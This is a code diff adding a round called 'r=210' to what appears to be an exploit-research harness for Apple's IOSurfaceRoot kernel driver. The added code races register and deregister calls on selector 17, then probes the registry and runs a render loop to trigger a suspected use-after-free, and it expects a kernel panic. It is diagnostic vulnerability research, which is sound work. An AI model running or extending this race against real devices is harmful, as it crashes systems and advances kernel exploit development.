@@ -25676,6 +25676,92 @@ new_modes:
                 rlog("=== r=209 complete ===\n");
             }
 
+            /* r=210: Race-then-crash verification
+             *
+             * The r=209 anomalies are "normal" race contention (register/deregister
+             * same entry). To create an ACTUAL dangling pointer, we need the
+             * race to corrupt the registry linked list.
+             *
+             * Strategy: after the race, DON'T spray — let the freed entry stay
+             * dangling. Then trigger a registry traversal (via sel17 on the
+             * SAME connection) which should crash on the stale pointer.
+             *
+             * If it crashes → confirms dangling entry exists
+             * If it survives → the race didn't create a real dangling entry
+             *
+             * This is a DIAGNOSTIC test — expects kernel panic on success.
+             *
+             * Usage: iosurface_sel17 210 [iters]
+             */
+            if (rounds == 210) {
+                rlog("\n=== r=210: Race-then-crash verification ===\n");
+                rlog("  WARNING: This test is EXPECTED to cause kernel panic!\n");
+                int r210_iters = 1000;
+                if (argc > 3) r210_iters = atoi(argv[3]);
+                rlog("  Race iters: %d\n", r210_iters);
+
+                io_service_t r210_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r210_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r210_done; }
+
+                io_connect_t r210_rc = IO_OBJECT_NULL;
+                IOServiceOpen(r210_svc, mach_task_self(), 0, &r210_rc);
+                if (!r210_rc) { rlog("  open failed\n"); goto r210_done; }
+
+                /* Tight 2-thread race — no spray after */
+                r209_conn = r210_rc;
+                r209_go = 0;
+                r209_stop = 0;
+                r209_reg_ok = r209_reg_fail = 0;
+                r209_dereg_ok = r209_dereg_fail = 0;
+                r209_max_iters = r210_iters;
+
+                pthread_t ta, tb;
+                pthread_create(&ta, NULL, r209_reg_thread, NULL);
+                pthread_create(&tb, NULL, r209_dereg_thread, NULL);
+                __sync_synchronize();
+                r209_go = 1;
+                pthread_join(ta, NULL);
+                pthread_join(tb, NULL);
+
+                rlog("  Race: reg=%d/%d dereg=%d/%d\n",
+                     r209_reg_ok, r209_reg_fail, r209_dereg_ok, r209_dereg_fail);
+
+                /* Now try to register a NEW entry on the same connection
+                 * This triggers an internal registry traversal which will
+                 * hit any dangling pointers in the linked list */
+                rlog("  Triggering registry traversal with new sel17...\n");
+                for (int probe = 0; probe < 20; probe++) {
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref = 0x210000 + probe;
+                    uint64_t inp[3] = {(uint64_t)(0x210 + probe), 0xBBBB, 0xCCCC};
+                    kern_return_t kr = IOConnectCallAsyncMethod(r210_rc, 17, wp, &ref, 1,
+                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                    rlog("  probe %d: sel17 kr=0x%x\n", probe, (unsigned)kr);
+                    mach_port_deallocate(mach_task_self(), wp);
+                }
+
+                /* Also try render loop which triggers compositor traversal */
+                rlog("  Render (2s)...");
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t rt;
+                pthread_create(&rt, NULL, p13_render_loop, NULL);
+                usleep(2000000);
+                p13_render_run = 0;
+                pthread_join(rt, NULL);
+                rlog(" frames=%d\n", p13_render_frames);
+
+                rlog("  SURVIVED — no dangling entry in registry list\n");
+
+                IOServiceClose(r210_rc);
+                IOObjectRelease(r210_svc);
+                r210_done:
+                rlog("=== r=210 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
